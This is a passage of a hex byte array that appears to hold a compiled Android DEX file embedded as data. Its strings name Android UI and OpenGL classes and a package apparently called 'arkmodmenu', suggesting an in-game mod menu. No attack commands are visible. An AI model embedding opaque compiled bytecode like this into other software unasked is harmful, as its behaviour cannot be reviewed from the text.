    0x4b, 0x69, 0x7a, 0x4b, 0x69, 0x00, 0x51, 0x00, 0x0e, 0x89, 0x4c, 0x00, 0x10, 0x00, 0x0e, 0x00, 
    0x13, 0x00, 0x0e, 0x6b, 0x2e, 0x02, 0x33, 0xa4, 0x00, 0x9a, 0x01, 0x01, 0x00, 0x0e, 0x00, 0x9d, 
    0x01, 0x00, 0x0e, 0xf3, 0x5a, 0x5a, 0x00, 0xf0, 0x01, 0x02, 0x00, 0x00, 0x0e, 0x87, 0xd2, 0xc3, 
    0xd5, 0xa5, 0x3c, 0x5a, 0x69, 0x01, 0x24, 0x10, 0x8a, 0x3c, 0x4b, 0x99, 0x69, 0x01, 0x24, 0x10, 
    0x88, 0x4b, 0x00, 0xec, 0x01, 0x01, 0x00, 0x0e, 0x00, 0xba, 0x02, 0x01, 0x00, 0x0e, 0x01, 0x12, 
    0x10, 0x63, 0x7a, 0x6b, 0x78, 0x4e, 0x2d, 0x2d, 0x2d, 0x00, 0x23, 0x00, 0x0e, 0x00, 0x26, 0x00, 
    0x0e, 0x00, 0x59, 0x01, 0x00, 0x0e, 0x87, 0x3c, 0x00, 0x55, 0x01, 0x00, 0x3b, 0x00, 0x29, 0x01, 
    0x00, 0x0e, 0x5d, 0x2d, 0xe1, 0x4e, 0x87, 0x3e, 0x2d, 0xa5, 0xa5, 0x97, 0x4b, 0x4b, 0x4b, 0x4b, 
    0x4b, 0x4b, 0x7a, 0x69, 0x4b, 0x4b, 0x7a, 0xc3, 0x5a, 0x01, 0x1c, 0x0f, 0x00, 0x60, 0x00, 0x1d, 
    0x3c, 0x2d, 0x2d, 0x3d, 0x5a, 0x5a, 0x2f, 0x5a, 0x5a, 0x5a, 0x4b, 0x4b, 0x2e, 0x4b, 0x5e, 0x5a, 
    0x2d, 0x2d, 0x00, 0xd9, 0x02, 0x01, 0x00, 0x2c, 0xb7, 0xe1, 0xff, 0x00, 0xeb, 0x01, 0x03, 0x00, 
    0x00, 0x00, 0x0e, 0x5a, 0x02, 0x27, 0x86, 0x4b, 0x96, 0x4b, 0x96, 0x00, 0x9b, 0x02, 0x01, 0x00, 
    0x0e, 0xa8, 0x5a, 0x5b, 0x4b, 0x2e, 0x5a, 0x2e, 0x87, 0x69, 0x69, 0x00, 0xaf, 0x02, 0x01, 0x00, 
    0x2c, 0x5e, 0x00, 0x84, 0x01, 0x01, 0x00, 0x0e, 0x87, 0x5a, 0x5b, 0x4b, 0x3f, 0xc3, 0x61, 0x02, 
    0x7a, 0x77, 0x5a, 0x3c, 0x00, 0x9a, 0x01, 0x01, 0x00, 0x0e, 0x02, 0x0c, 0x77, 0x00, 0xaa, 0x01, 
    0x01, 0x00, 0x0e, 0xc7, 0x78, 0x4b, 0x8b, 0x69, 0x01, 0x10, 0x14, 0x87, 0xb4, 0xb4, 0xf0, 0xe2, 
    0x69, 0x3e, 0xa8, 0x69, 0x8a, 0x01, 0x1a, 0x13, 0x2d, 0x2d, 0x2d, 0x2d, 0x4b, 0x4b, 0x4b, 0x4b, 
    0x4b, 0xb5, 0x01, 0x36, 0x12, 0x01, 0x12, 0x0f, 0x02, 0x53, 0x4a, 0x02, 0x7a, 0x4a, 0x00, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x4e, 0x00, 0x00, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x27, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x02, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x50, 0x00, 0x50, 0x00, 
    0x53, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 
    0x62, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x02, 0x00, 
    0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x24, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x50, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x4c, 0x00, 0x61, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x50, 0x00, 0x60, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x05, 0x00, 0x00, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x06, 0x00, 0x00, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 0x02, 0x00, 
    0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x02, 0x00, 0x50, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x04, 0x00, 0x0f, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x22, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x07, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x07, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00, 0x00, 
    0x07, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x18, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x1e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x32, 0x00, 0x04, 0x00, 
    0x01, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5a, 0x00, 0x00, 0x00, 
    0x03, 0x00, 0x00, 0x00, 0x5a, 0x00, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x5a, 0x00, 0x59, 0x00, 0x03, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x11, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x02, 0x00, 0x03, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x02, 0x00, 
    0x16, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x03, 0x00, 0x00, 0x00, 
    0x28, 0x00, 0x02, 0x00, 0x16, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x4e, 0x00, 0x03, 0x00, 
    0x00, 0x00, 0x03, 0x20, 0x68, 0x3d, 0x00, 0x04, 0x20, 0x69, 0x64, 0x3d, 0x00, 0x03, 0x20, 0x77, 
    0x3d, 0x00, 0x03, 0x20, 0x78, 0x3d, 0x00, 0x03, 0x20, 0x79, 0x3d, 0x00, 0x03, 0x28, 0x29, 0x56, 
    0x00, 0x15, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x66, 0x67, 0x65, 0x74, 0x61, 
    0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x00, 0x13, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 
    0x24, 0x73, 0x66, 0x67, 0x65, 0x74, 0x65, 0x64, 0x69, 0x74, 0x6f, 0x72, 0x00, 0x19, 0x2d, 0x24, 
    0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x66, 0x67, 0x65, 0x74, 0x74, 0x6f, 0x75, 0x63, 0x68, 
    0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x00, 0x1f, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 
    0x24, 0x73, 0x66, 0x67, 0x65, 0x74, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 0x64, 0x6c, 
    0x65, 0x72, 0x50, 0x61, 0x72, 0x61, 0x6d, 0x73, 0x00, 0x1a, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 
    0x74, 0x24, 0x73, 0x66, 0x67, 0x65, 0x74, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x4c, 0x6f, 0x67, 0x43, 
    0x6f, 0x75, 0x6e, 0x74, 0x00, 0x1a, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x66, 
    0x67, 0x65, 0x74, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 
    0x00, 0x1f, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x66, 0x70, 0x75, 0x74, 0x61, 
    0x63, 0x74, 0x69, 0x76, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x49, 0x6e, 0x64, 0x65, 
    0x78, 0x00, 0x1f, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x66, 0x70, 0x75, 0x74, 
    0x74, 0x6f, 0x75, 0x63, 0x68, 0x47, 0x65, 0x73, 0x74, 0x75, 0x72, 0x65, 0x41, 0x63, 0x74, 0x69, 
    0x76, 0x65, 0x00, 0x1a, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x66, 0x70, 0x75, 
    0x74, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x4c, 0x6f, 0x67, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x00, 0x10, 
    0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x6d, 0x63, 0x61, 0x6e, 0x63, 0x65, 0x6c, 
    0x00, 0x10, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x6d, 0x63, 0x6f, 0x6d, 0x6d, 
    0x69, 0x74, 0x00, 0x1e, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x6d, 0x66, 0x65, 
    0x74, 0x63, 0x68, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 
    0x74, 0x79, 0x00, 0x13, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 0x73, 0x6d, 0x69, 0x73, 
    0x45, 0x6e, 0x74, 0x65, 0x72, 0x55, 0x70, 0x00, 0x1d, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 
    0x24, 0x73, 0x6d, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 
    0x6e, 0x64, 0x6c, 0x65, 0x72, 0x73, 0x00, 0x1c, 0x2d, 0x24, 0x24, 0x4e, 0x65, 0x73, 0x74, 0x24, 
    0x73, 0x6d, 0x77, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 
    0x74, 0x69, 0x6f, 0x6e, 0x00, 0x04, 0x31, 0x30, 0x30, 0x30, 0x00, 0x08, 0x3c, 0x63, 0x6c, 0x69, 
    0x6e, 0x69, 0x74, 0x3e, 0x00, 0x06, 0x3c, 0x69, 0x6e, 0x69, 0x74, 0x3e, 0x00, 0x01, 0x43, 0x00, 
    0x0c, 0x43, 0x4f, 0x4c, 0x4f, 0x52, 0x5f, 0x41, 0x43, 0x54, 0x49, 0x4f, 0x4e, 0x00, 0x0c, 0x43, 
    0x4f, 0x4c, 0x4f, 0x52, 0x5f, 0x42, 0x4f, 0x52, 0x44, 0x45, 0x52, 0x00, 0x0d, 0x43, 0x4f, 0x4c, 
    0x4f, 0x52, 0x5f, 0x44, 0x49, 0x56, 0x49, 0x44, 0x45, 0x52, 0x00, 0x0c, 0x43, 0x4f, 0x4c, 0x4f, 
    0x52, 0x5f, 0x45, 0x44, 0x49, 0x54, 0x4f, 0x52, 0x00, 0x13, 0x43, 0x4f, 0x4c, 0x4f, 0x52, 0x5f, 
    0x45, 0x44, 0x49, 0x54, 0x4f, 0x52, 0x5f, 0x42, 0x4f, 0x52, 0x44, 0x45, 0x52, 0x00, 0x0c, 0x43, 
    0x4f, 0x4c, 0x4f, 0x52, 0x5f, 0x48, 0x45, 0x41, 0x44, 0x45, 0x52, 0x00, 0x10, 0x43, 0x4f, 0x4c, 
    0x4f, 0x52, 0x5f, 0x4d, 0x55, 0x54, 0x45, 0x44, 0x5f, 0x54, 0x45, 0x58, 0x54, 0x00, 0x0b, 0x43, 
    0x4f, 0x4c, 0x4f, 0x52, 0x5f, 0x50, 0x41, 0x4e, 0x45, 0x4c, 0x00, 0x0a, 0x43, 0x4f, 0x4c, 0x4f, 
    0x52, 0x5f, 0x54, 0x45, 0x58, 0x54, 0x00, 0x06, 0x43, 0x61, 0x6e, 0x63, 0x65, 0x6c, 0x00, 0x07, 
    0x44, 0x45, 0x46, 0x41, 0x55, 0x4c, 0x54, 0x00, 0x01, 0x46, 0x00, 0x02, 0x46, 0x4c, 0x00, 0x11, 
    0x47, 0x4c, 0x45, 0x53, 0x33, 0x4a, 0x4e, 0x49, 0x56, 0x69, 0x65, 0x77, 0x2e, 0x6a, 0x61, 0x76, 
    0x61, 0x00, 0x01, 0x49, 0x00, 0x02, 0x49, 0x46, 0x00, 0x03, 0x49, 0x49, 0x49, 0x00, 0x02, 0x49, 
    0x4c, 0x00, 0x04, 0x49, 0x4c, 0x49, 0x49, 0x00, 0x03, 0x49, 0x4c, 0x4c, 0x00, 0x04, 0x49, 0x4c, 
    0x4c, 0x4c, 0x00, 0x0d, 0x49, 0x4e, 0x56, 0x41, 0x4c, 0x49, 0x44, 0x5f, 0x56, 0x41, 0x4c, 0x55, 
    0x45, 0x00, 0x02, 0x49, 0x5a, 0x00, 0x12, 0x49, 0x6d, 0x65, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x43, 
    0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 0x65, 0x72, 0x00, 0x17, 0x49, 0x6d, 0x65, 0x49, 0x6e, 
    0x70, 0x75, 0x74, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x6c, 0x65, 0x72, 0x2e, 0x6a, 0x61, 
    0x76, 0x61, 0x00, 0x01, 0x4a, 0x00, 0x01, 0x4c, 0x00, 0x03, 0x4c, 0x43, 0x43, 0x00, 0x02, 0x4c, 
    0x46, 0x00, 0x02, 0x4c, 0x49, 0x00, 0x05, 0x4c, 0x49, 0x49, 0x49, 0x49, 0x00, 0x03, 0x4c, 0x49, 
    0x4c, 0x00, 0x02, 0x4c, 0x4c, 0x00, 0x03, 0x4c, 0x4c, 0x49, 0x00, 0x03, 0x4c, 0x4c, 0x4c, 0x00, 
    0x02, 0x4c, 0x5a, 0x00, 0x16, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x61, 0x70, 
    0x70, 0x2f, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x3b, 0x00, 0x34, 0x4c, 0x61, 0x6e, 
    0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x61, 0x70, 0x70, 0x2f, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 
    0x61, 0x74, 0x69, 0x6f, 0x6e, 0x24, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x4c, 0x69, 
    0x66, 0x65, 0x63, 0x79, 0x63, 0x6c, 0x65, 0x43, 0x61, 0x6c, 0x6c, 0x62, 0x61, 0x63, 0x6b, 0x73, 
    0x3b, 0x00, 0x19, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x61, 0x70, 0x70, 0x2f, 
    0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3b, 0x00, 0x19, 0x4c, 0x61, 
    0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2f, 0x43, 
    0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x3b, 0x00, 0x1f, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 
    0x64, 0x2f, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2f, 0x72, 0x65, 0x73, 0x2f, 0x52, 0x65, 
    0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x73, 0x3b, 0x00, 0x1b, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 
    0x69, 0x64, 0x2f, 0x67, 0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x73, 0x2f, 0x54, 0x79, 0x70, 0x65, 
    0x66, 0x61, 0x63, 0x65, 0x3b, 0x00, 0x24, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 
    0x67, 0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x73, 0x2f, 0x64, 0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 
    0x65, 0x2f, 0x44, 0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x3b, 0x00, 0x2c, 0x4c, 0x61, 0x6e, 
    0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x67, 0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x73, 0x2f, 0x64, 
    0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x2f, 0x47, 0x72, 0x61, 0x64, 0x69, 0x65, 0x6e, 0x74, 
    0x44, 0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x3b, 0x00, 0x27, 0x4c, 0x61, 0x6e, 0x64, 0x72, 
    0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x70, 0x65, 0x6e, 0x67, 0x6c, 0x2f, 0x47, 0x4c, 0x53, 0x75, 0x72, 
    0x66, 0x61, 0x63, 0x65, 0x56, 0x69, 0x65, 0x77, 0x24, 0x52, 0x65, 0x6e, 0x64, 0x65, 0x72, 0x65, 
    0x72, 0x3b, 0x00, 0x1e, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x70, 0x65, 
    0x6e, 0x67, 0x6c, 0x2f, 0x47, 0x4c, 0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 0x56, 0x69, 0x65, 
    0x77, 0x3b, 0x00, 0x1a, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x73, 0x2f, 
    0x42, 0x75, 0x69, 0x6c, 0x64, 0x24, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4f, 0x4e, 0x3b, 0x00, 0x13, 
    0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x73, 0x2f, 0x42, 0x75, 0x6e, 0x64, 
    0x6c, 0x65, 0x3b, 0x00, 0x14, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x73, 
    0x2f, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x3b, 0x00, 0x14, 0x4c, 0x61, 0x6e, 0x64, 0x72, 
    0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x73, 0x2f, 0x49, 0x42, 0x69, 0x6e, 0x64, 0x65, 0x72, 0x3b, 0x00, 
    0x13, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x6f, 0x73, 0x2f, 0x4c, 0x6f, 0x6f, 
    0x70, 0x65, 0x72, 0x3b, 0x00, 0x17, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x74, 
    0x65, 0x78, 0x74, 0x2f, 0x45, 0x64, 0x69, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x3b, 0x00, 0x1d, 0x4c, 
    0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x75, 0x74, 0x69, 0x6c, 0x2f, 0x44, 0x69, 0x73, 
    0x70, 0x6c, 0x61, 0x79, 0x4d, 0x65, 0x74, 0x72, 0x69, 0x63, 0x73, 0x3b, 0x00, 0x12, 0x4c, 0x61, 
    0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x75, 0x74, 0x69, 0x6c, 0x2f, 0x4c, 0x6f, 0x67, 0x3b, 
    0x00, 0x17, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 
    0x4b, 0x65, 0x79, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x3b, 0x00, 0x1a, 0x4c, 0x61, 0x6e, 0x64, 0x72, 
    0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x4d, 0x6f, 0x74, 0x69, 0x6f, 0x6e, 0x45, 
    0x76, 0x65, 0x6e, 0x74, 0x3b, 0x00, 0x16, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 
    0x76, 0x69, 0x65, 0x77, 0x2f, 0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 0x3b, 0x00, 0x1c, 0x4c, 
    0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x53, 0x75, 0x72, 
    0x66, 0x61, 0x63, 0x65, 0x48, 0x6f, 0x6c, 0x64, 0x65, 0x72, 0x3b, 0x00, 0x23, 0x4c, 0x61, 0x6e, 
    0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x56, 0x69, 0x65, 0x77, 0x24, 
    0x4f, 0x6e, 0x43, 0x6c, 0x69, 0x63, 0x6b, 0x4c, 0x69, 0x73, 0x74, 0x65, 0x6e, 0x65, 0x72, 0x3b, 
    0x00, 0x21, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 
    0x56, 0x69, 0x65, 0x77, 0x24, 0x4f, 0x6e, 0x4b, 0x65, 0x79, 0x4c, 0x69, 0x73, 0x74, 0x65, 0x6e, 
    0x65, 0x72, 0x3b, 0x00, 0x23, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 
    0x65, 0x77, 0x2f, 0x56, 0x69, 0x65, 0x77, 0x24, 0x4f, 0x6e, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x4c, 
    0x69, 0x73, 0x74, 0x65, 0x6e, 0x65, 0x72, 0x3b, 0x00, 0x13, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 
    0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x56, 0x69, 0x65, 0x77, 0x3b, 0x00, 0x25, 0x4c, 
    0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x56, 0x69, 0x65, 
    0x77, 0x47, 0x72, 0x6f, 0x75, 0x70, 0x24, 0x4c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x50, 0x61, 0x72, 
    0x61, 0x6d, 0x73, 0x3b, 0x00, 0x19, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 
    0x69, 0x65, 0x77, 0x2f, 0x56, 0x69, 0x65, 0x77, 0x50, 0x61, 0x72, 0x65, 0x6e, 0x74, 0x3b, 0x00, 
    0x15, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x57, 
    0x69, 0x6e, 0x64, 0x6f, 0x77, 0x3b, 0x00, 0x29, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 
    0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x4d, 0x61, 0x6e, 0x61, 
    0x67, 0x65, 0x72, 0x24, 0x4c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x50, 0x61, 0x72, 0x61, 0x6d, 0x73, 
    0x3b, 0x00, 0x1c, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 
    0x2f, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x3b, 0x00, 
    0x2d, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x76, 0x69, 0x65, 0x77, 0x2f, 0x69, 
    0x6e, 0x70, 0x75, 0x74, 0x6d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x2f, 0x49, 0x6e, 0x70, 0x75, 0x74, 
    0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x3b, 0x00, 0x19, 
    0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x77, 0x69, 0x64, 0x67, 0x65, 0x74, 0x2f, 
    0x45, 0x64, 0x69, 0x74, 0x54, 0x65, 0x78, 0x74, 0x3b, 0x00, 0x2a, 0x4c, 0x61, 0x6e, 0x64, 0x72, 
    0x6f, 0x69, 0x64, 0x2f, 0x77, 0x69, 0x64, 0x67, 0x65, 0x74, 0x2f, 0x4c, 0x69, 0x6e, 0x65, 0x61, 
    0x72, 0x4c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x24, 0x4c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x50, 0x61, 
    0x72, 0x61, 0x6d, 0x73, 0x3b, 0x00, 0x1d, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 
    0x77, 0x69, 0x64, 0x67, 0x65, 0x74, 0x2f, 0x4c, 0x69, 0x6e, 0x65, 0x61, 0x72, 0x4c, 0x61, 0x79, 
    0x6f, 0x75, 0x74, 0x3b, 0x00, 0x30, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 0x2f, 0x77, 
    0x69, 0x64, 0x67, 0x65, 0x74, 0x2f, 0x54, 0x65, 0x78, 0x74, 0x56, 0x69, 0x65, 0x77, 0x24, 0x4f, 
    0x6e, 0x45, 0x64, 0x69, 0x74, 0x6f, 0x72, 0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x4c, 0x69, 0x73, 
    0x74, 0x65, 0x6e, 0x65, 0x72, 0x3b, 0x00, 0x19, 0x4c, 0x61, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64, 
    0x2f, 0x77, 0x69, 0x64, 0x67, 0x65, 0x74, 0x2f, 0x54, 0x65, 0x78, 0x74, 0x56, 0x69, 0x65, 0x77, 
    0x3b, 0x00, 0x28, 0x4c, 0x63, 0x6f, 0x6d, 0x2f, 0x73, 0x61, 0x68, 0x69, 0x6c, 0x6d, 0x39, 0x30, 
    0x39, 0x38, 0x2f, 0x61, 0x72, 0x6b, 0x6d, 0x6f, 0x64, 0x6d, 0x65, 0x6e, 0x75, 0x2f, 0x47, 0x4c, 
